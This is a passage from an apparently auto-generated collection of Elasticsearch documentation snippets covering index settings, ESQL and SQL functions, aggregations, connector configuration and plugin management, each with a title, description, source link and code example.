\"_index\": \"my-index-000001\",\n  \"_id\": \"my_id\",\n  \"_version\": 1,\n  \"_seq_no\": 22,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"attachment\": {\n      \"content_type\": \"application/rtf\",\n      \"language\": \"ro\",\n      \"content\": \"Lorem ipsum dolor sit amet\",\n      \"content_length\": 28\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Elasticsearch Index Priority Using Update Index Settings API\nDESCRIPTION: This snippet demonstrates how to update the priority of an existing Elasticsearch index using the Update Index Settings API. It shows changing the index.priority setting for index_4 to 1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/recovery-prioritization.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT index_4/_settings\n{\n  \"index.priority\": 1\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Rank Evaluation API with Discounted Cumulative Gain Metric\nDESCRIPTION: This snippet demonstrates the use of the Elasticsearch Rank Evaluation API with the Discounted Cumulative Gain metric. It sets the k value to 20 and disables normalization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_rank_eval\n{\n  \"requests\": [\n    {\n      \"id\": \"JFK query\",\n      \"request\": { \"query\": { \"match_all\": {} } },\n      \"ratings\": []\n    } ],\n  \"metric\": {\n    \"dcg\": {\n      \"k\": 20,\n      \"normalize\": false\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Cube Root with CBRT Function in ESQL\nDESCRIPTION: This snippet demonstrates the use of the CBRT function in ESQL to calculate the cube root of a number. It creates a row with a double value and applies the CBRT function to it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/cbrt.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW d = 1000.0\n| EVAL c = CBRT(d)\n```\n\n----------------------------------------\n\nTITLE: Running the Docker Image for Slack Connector - Console\nDESCRIPTION: This console command shows how to run the Docker image for the Slack connector, specifying volume mounts for configuration and setting up the network. This is a step needed to execute the connector service.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-slack.md#2025-04-21_snippet_3\n\nLANGUAGE: Console\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Creating Oracle Connector using Elasticsearch API\nDESCRIPTION: This snippet demonstrates how to create a new self-managed Oracle connector using the Elasticsearch Create connector API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-oracle.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-oracle-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Oracle\",\n  \"service_type\": \"oracle\"\n}\n```\n\n----------------------------------------\n\nTITLE: Nested Document Handling in Elasticsearch Scripts\nDESCRIPTION: Provides methods for accessing and manipulating nested documents within Elasticsearch scripts\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update_by_query.txt#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.field.NestedDocument {\n    WriteField field(String)\n    Stream fields(String)\n    boolean isEmpty()\n    int size()\n    boolean exists()\n    void remove()\n}\n```\n\n----------------------------------------\n\nTITLE: Adding a bundle extension to a deployment plan in Elasticsearch Service\nDESCRIPTION: JSON snippet showing the user_bundles construct for adding a custom bundle to an Elasticsearch deployment. Uses wildcard notation for version compatibility across a major version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n      \"user_bundles\": [\n              {\n                    \"elasticsearch_version\": \"8.*\",\n                    \"name\": \"custom-bundle\",\n                    \"url\": \"repo://5886113212\"\n              }\n       ]\n```\n\n----------------------------------------\n\nTITLE: Testing Log Function with Invalid Base in ESQL\nDESCRIPTION: This SQL query tests the log function with invalid base values, including 1, 0, and negative numbers. These cases are expected to return null values and generate warnings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/log.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    log(1, 10) AS base_one,\n    log(0, 10) AS base_zero,\n    log(-1, 10) AS base_negative;\n```\n\n----------------------------------------\n\nTITLE: Import Client Certificate to Node Keystore\nDESCRIPTION: Imports the client's certificate into the node's keystore for trust\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nkeytool -import -alias test-client -keystore test-node.jks -storepass keypass -file test-client.crt -noprompt\n```\n\n----------------------------------------\n\nTITLE: Frequent Item Sets Aggregation with Two Fields and Exclude Parameter\nDESCRIPTION: Elasticsearch query using async search to find frequent item sets in e-commerce data, analyzing product categories and customer cities while excluding 'other' as a city name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-frequent-item-sets-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /kibana_sample_data_ecommerce/_async_search\n{\n   \"size\":0,\n   \"aggs\":{\n      \"my_agg\":{\n         \"frequent_item_sets\":{\n            \"minimum_set_size\":3,\n            \"fields\":[\n               {\n                  \"field\":\"category.keyword\"\n               },\n               {\n                  \"field\":\"geoip.city_name\",\n                  \"exclude\":\"other\"\n               }\n            ],\n            \"size\":3\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Outlook Connector for Docker Deployment\nDESCRIPTION: This YAML snippet shows a sample configuration for the Outlook connector when deploying it using Docker. It includes Elasticsearch connection details and connector-specific settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-outlook.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: outlook\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Response from Predicate Token Filter Analyze API\nDESCRIPTION: This snippet shows the response from the Elasticsearch analyze API when using the predicate_token_filter. It includes the filtered tokens with their positions and offsets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-predicatefilter-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n{\n  \"tokens\" : [\n    {\n      \"token\" : \"jumps\",\n      \"start_offset\" : 8,\n      \"end_offset\" : 13,\n      \"type\" : \"word\",\n      \"position\" : 2\n    },\n    {\n      \"token\" : \"lazy\",\n      \"start_offset\" : 18,\n      \"end_offset\" : 22,\n      \"type\" : \"word\",\n      \"position\" : 4\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: String Stats with Runtime Field Script\nDESCRIPTION: Demonstrates using string_stats aggregation with a runtime field that combines multiple field values using a script.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-string-stats-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"message_and_context\": {\n      \"type\": \"keyword\",\n      \"script\": \"\"\"\n        emit(doc['message.keyword'].value + ' ' + doc['context.keyword'].value)\n      \"\"\"\n    }\n  },\n  \"aggs\": {\n    \"message_stats\": {\n      \"string_stats\": { \"field\": \"message_and_context\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Elasticsearch Data Path in YAML\nDESCRIPTION: Configures the data directory path where Elasticsearch stores shards, index and cluster metadata. The path can be absolute or relative to ES_HOME.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/node-settings.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\npath.data:  /var/elasticsearch/data\n```\n\n----------------------------------------\n\nTITLE: Running End-to-End Tests for Zoom Connector\nDESCRIPTION: This snippet demonstrates how to run functional tests for the Zoom connector against a real data source. It shows two commands: one for running a full test and another for running a faster test with a smaller data size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-zoom.md#2025-04-22_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ make ftest NAME=zoom\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=zoom DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Block Elements Group in Elasticsearch YAML\nDESCRIPTION: Includes block HTML elements like p, div, headings, lists and blockquote in the sanitization configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_26\n\nLANGUAGE: yaml\nCODE:\n```\n_blocks\n```\n\n----------------------------------------\n\nTITLE: Mapping an annotated-text field in Elasticsearch\nDESCRIPTION: Creates an index with a mapping for an annotated-text field named 'my_field'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text-usage.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_field\": {\n        \"type\": \"annotated_text\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Declaring Capability Requirements for Test Skipping in Elasticsearch YAML Rest Tests - YAML\nDESCRIPTION: This YAML snippet demonstrates how to declaratively specify capability requirements for test execution conditions in Elasticsearch YAML Rest tests. It supports specifying HTTP method, endpoint path, required query parameters, and custom endpoint capabilities. All fields except 'method' are required for fine-grained test gating. The structure ensures that specified tests are only run if all nodes in the cluster meet the declared capability set, with the default HTTP method set to 'GET' if omitted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/Versioning.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\n- requires:\n    capabilities:\n      - method: GET\n        path: /_endpoint\n        parameters: [param1, param2]\n        capabilities: [cap1, cap2]\n\n```\n\n----------------------------------------\n\nTITLE: Using Runtime Fields for Complex Weight Calculations in Elasticsearch\nDESCRIPTION: This snippet illustrates how to use a runtime field to combine multiple weights and a custom script for value calculation in a weighted_avg aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-weight-avg-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /exams/_doc?refresh\n{\n  \"grade\": 100,\n  \"weight\": [2, 3]\n}\nPOST /exams/_doc?refresh\n{\n  \"grade\": 80,\n  \"weight\": 3\n}\n\nPOST /exams/_search?filter_path=aggregations\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"weight.combined\": {\n      \"type\": \"double\",\n      \"script\": \"\"\"\n        double s = 0;\n        for (double w : doc['weight']) {\n          s += w;\n        }\n        emit(s);\n      \"\"\"\n    }\n  },\n  \"aggs\": {\n    \"weighted_grade\": {\n      \"weighted_avg\": {\n        \"value\": {\n          \"script\": \"doc.grade.value + 1\"\n        },\n        \"weight\": {\n          \"field\": \"weight.combined\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading Sample Configuration File for Docker Deployment\nDESCRIPTION: Instructions on downloading a sample connector configuration file using curl. The file serves as a template for configuring a custom self-managed connector setup.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Sample Document with Array Values\nDESCRIPTION: Example document containing an array of string values that will be processed by the Foreach processor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"values\" : [\"foo\", \"bar\", \"baz\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Standard Tokenizer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the standard tokenizer to analyze a sample text. It shows the input text and the expected output tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-standard-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"standard\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ The, 2, QUICK, Brown, Foxes, jumped, over, the, lazy, dog's, bone ]\n```\n\n----------------------------------------\n\nTITLE: Configuring Security Domain in Elasticsearch YAML\nDESCRIPTION: Example configuration for setting up a security domain with multiple authentication realms. Demonstrates how to specify domain name and associate realms with it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nxpack:\n  security:\n    authc:\n      domains:\n        my_domain:\n          realms: [ 'default_native', 'saml1' ]\n```\n\n----------------------------------------\n\nTITLE: Moving Sum Function Example\nDESCRIPTION: Example of using the pre-built sum function in a moving function aggregation to calculate sum of values in the window.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_moving_sum\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"MovingFunctions.sum(values)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering ESQL records where birth_date is NULL\nDESCRIPTION: This snippet shows how to use the `IS NULL` predicate in ESQL to select records from the `employees` table where the `birth_date` column contains a NULL value.  The query returns all rows where the `birth_date` field is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/predicates.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE birth_date IS NULL\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON Envelope in Elasticsearch\nDESCRIPTION: Example of indexing an Envelope type in Elasticsearch using GeoJSON format. The envelope is defined by upper left and lower right coordinates to represent a bounding rectangle.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_18\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"envelope\",\n    \"coordinates\" : [ [1000.0, 100.0], [1001.0, 100.0] ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Terms Value Source Aggregation Example\nDESCRIPTION: Demonstrates how to use the terms value source in a composite aggregation. This example extracts values from a product field to create composite buckets, similar to a simple terms aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"product\": { \"terms\": { \"field\": \"product\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Auto-Flattening Object Mappings in Elasticsearch with Subobjects Disabled\nDESCRIPTION: This example demonstrates how to use auto-flattening with subobjects disabled. Object mappings defined within an object with 'subobjects: false' will be automatically flattened before being stored, converting nested object structures to dotted field names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/subobjects.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000002\n{\n  \"mappings\": {\n    \"properties\": {\n      \"metrics\": {\n        \"subobjects\": false,\n        \"properties\": {\n          \"time\": {\n            \"type\": \"object\", <1>\n            \"properties\": {\n              \"min\": { \"type\": \"long\" }, <2>\n              \"max\": { \"type\": \"long\" }\n            }\n          }\n        }\n      }\n    }\n  }\n}\nGET my-index-000002/_mapping\n```\n\n----------------------------------------\n\nTITLE: Output of Number Formatting Pattern Replace\nDESCRIPTION: The resulting terms after applying the pattern_replace filter to format numbers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-replace-charfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ My, credit, card, is, 123_456_789 ]\n```\n\n----------------------------------------\n\nTITLE: Example of ASIN Function Usage\nDESCRIPTION: Shows the relationship between ASIN and SIN by demonstrating that ASIN(SIN(45°)) equals 45° and that SIN(45°) equals 0.707 (approximately).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_38\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ROUND(DEGREES(ASIN(0.7071067811865475))) AS \"ASIN(0.707)\", ROUND(SIN(RADIANS(45)), 3) AS \"SIN(45)\";\n\n  ASIN(0.707)  |    SIN(45)\n---------------+---------------\n45.0           |0.707\n```\n\n----------------------------------------\n\nTITLE: Finding Maximum Value in Integer Array using MV_MAX in ESQL\nDESCRIPTION: Example showing how to use MV_MAX function to find the maximum value in an integer array. Returns 5 as the maximum value from the array [3, 5, 1].\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_max.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 5, 1]\n| EVAL max_a = MV_MAX(a)\n```\n\n----------------------------------------\n\nTITLE: Using CONCAT Function in Elasticsearch SQL\nDESCRIPTION: Returns a character string that is the result of concatenating two string expressions. Treats null values as empty strings and has a limit of 1 MB for the resulting string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nCONCAT(\n    string_exp1, <1>\n    string_exp2) <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CONCAT('Elasticsearch', ' SQL');\n\nCONCAT('Elasticsearch', ' SQL')\n-------------------------------\nElasticsearch SQL\n```\n\n----------------------------------------\n\nTITLE: Using Span Fragmenter with Plain Highlighter\nDESCRIPTION: This example demonstrates using the 'span' fragmenter with the 'plain' highlighter type, which tries to avoid breaking up text between highlighted terms compared to the 'simple' fragmenter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_27\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match_phrase\": { \"message\": \"number 1\" }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"message\": {\n        \"type\": \"plain\",\n        \"fragment_size\": 15,\n        \"number_of_fragments\": 3,\n        \"fragmenter\": \"span\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing GCE Discovery Plugin from Elasticsearch\nDESCRIPTION: This command removes the GCE Discovery plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove discovery-gce\n```\n\n----------------------------------------\n\nTITLE: Handling Multiple Values with Single Weight in Elasticsearch Weighted Average\nDESCRIPTION: This example shows how the weighted_avg aggregation processes a document with multiple values in the 'grade' field and a single weight, applying the weight to each value independently.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-weight-avg-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /exams/_doc?refresh\n{\n  \"grade\": [1, 2, 3],\n  \"weight\": 2\n}\n\nPOST /exams/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"weighted_grade\": {\n      \"weighted_avg\": {\n        \"value\": {\n          \"field\": \"grade\"\n        },\n        \"weight\": {\n          \"field\": \"weight\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering with Query DSL in EQL Search for Elasticsearch\nDESCRIPTION: This example shows how to use the filter parameter with Query DSL to limit the documents on which an EQL query runs in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_22\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"filter\": {\n    \"range\": {\n      \"@timestamp\": {\n        \"gte\": \"now-1d/d\",\n        \"lt\": \"now/d\"\n      }\n    }\n  },\n  \"query\": \"\"\"\n    file where (file.type == \"file\" and file.name == \"cmd.exe\")\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Index Origination Date\nDESCRIPTION: Dynamic index-level setting for specifying the timestamp used to calculate backing index generation age after rollover.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nindex.lifecycle.origination_date: <unix_epoch_milliseconds>\n```\n\n----------------------------------------\n\nTITLE: Total Suffix Metric Example\nDESCRIPTION: This snippet gives examples that incorporates the `total` suffix, combined with other time or storage metrics, which represent a monotonic increasing counter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_7\n\nLANGUAGE: none\nCODE:\n```\n\"es.process.jvm.collection.time.total\"\n```\n\nLANGUAGE: none\nCODE:\n```\n\"es.indices.storage.write.total\"\n```\n\n----------------------------------------\n\nTITLE: Handling Missing Values in Top Metrics Aggregation\nDESCRIPTION: This example demonstrates how to handle missing values in top_metrics aggregation using the 'missing' parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-top-metrics.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"nr\":    { \"type\": \"integer\" },\n      \"state\":  { \"type\": \"keyword\"  }\n    }\n  }\n}\nPOST /my-index/_bulk?refresh\n{\"index\": {}}\n{\"nr\": 1, \"state\": \"started\"}\n{\"index\": {}}\n{\"nr\": 2, \"state\": \"stopped\"}\n{\"index\": {}}\n{\"nr\": 3, \"state\": \"N/A\"}\n{\"index\": {}}\n{\"nr\": 4}\nPOST /my-index/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"my_top_metrics\": {\n      \"top_metrics\": {\n        \"metrics\": {\n          \"field\": \"state\",\n          \"missing\": \"N/A\"},\n        \"sort\": {\"nr\": \"desc\"}\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Painless Script for Action-Specific Transform - Multi Action\nDESCRIPTION: This Painless script formats monetary values and concatenates them into a comma-separated string specifically for the `log_money_makers` action. It retrieves data from the transformed payload (`ctx.payload.money_makers`)\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_7\n\nLANGUAGE: painless\nCODE:\n```\n\n          def formatter = NumberFormat.getCurrencyInstance();\n          return [\n            'plays_value': ctx.payload.money_makers.stream()\n              .map(t-> formatter.format(t.total_value) + ' for the play ' + t.play)\n              .collect(Collectors.joining(\", \"))\n          ]\n          \n```\n\n----------------------------------------\n\nTITLE: Describing Base64 Decoding Function in Elasticsearch\nDESCRIPTION: This snippet provides a brief description of a base64 decoding function. It is likely part of the documentation for Elasticsearch's query language (ESQL) and explains the purpose of the function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/from_base64.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nDecode a base64 string.\n```\n\n----------------------------------------\n\nTITLE: Creating an API Key for the Zoom Connector\nDESCRIPTION: API call to generate a security API key with the necessary permissions for the connector to access and modify Elasticsearch indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-zoom.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Time Series End Time in Elasticsearch\nDESCRIPTION: Configuration for the latest acceptable @timestamp value in a time series index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/time-series.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nindex.time_series.end_time: \"2024-01-01T00:00:00Z\"\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL Function Parameter in Markdown\nDESCRIPTION: This snippet defines the 'field' parameter for an ESQL function. It explains that the input can be a single- or multi-valued column or an expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_double.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Input value. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Setting GCE Machine Permissions with gcloud Command-line Flag\nDESCRIPTION: Shows the required scopes flag when creating GCE instances using gcloud to provide necessary compute read-write permissions for the Elasticsearch discovery plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-tips.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n--scopes=compute-rw\n```\n\n----------------------------------------\n\nTITLE: Removing ICU Analysis Plugin from Elasticsearch\nDESCRIPTION: Command to remove the ICU analysis plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove analysis-icu\n```\n\n----------------------------------------\n\nTITLE: Setting Time Series Start Time in Elasticsearch\nDESCRIPTION: Configuration for the earliest acceptable @timestamp value in a time series index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/time-series.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nindex.time_series.start_time: \"2023-01-01T00:00:00Z\"\n```\n\n----------------------------------------\n\nTITLE: Indexing a MultiPoint Shape in GeoJSON Format\nDESCRIPTION: This example shows how to index a multipoint shape in GeoJSON format. The multipoint is defined with a type and coordinates array containing multiple independent points.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"multipoint\",\n    \"coordinates\" : [\n      [1002.0, 1002.0], [1003.0, 2000.0]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Elasticsearch Deployment and Plugin Reference in JSON\nDESCRIPTION: This JSON snippet shows how to update an Elasticsearch deployment plan to upgrade the Elasticsearch version and update the plugin reference. It includes setting the new Elasticsearch version and updating the user plugin's Elasticsearch version to match exactly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_18\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"Extensions\",\n    \"prune_orphans\": false,\n    \"resources\": {\n        \"elasticsearch\": [\n            {\n                \"region\": \"gcp-us-central1\",\n                \"ref_id\": \"main-elasticsearch\",\n                \"plan\": {\n                    \"cluster_topology\": [\n                      ...\n                    ],\n                    \"elasticsearch\": {\n                        \"version\": \"8.4.3\",\n                        \"enabled_built_in_plugins\": [],\n                        \"user_plugins\": [\n                           {\n                                \"elasticsearch_version\": \"8.4.3\",\n                                \"name\": \"custom-plugin\",\n                                \"url\": \"repo://4226448541\"\n                            }\n                        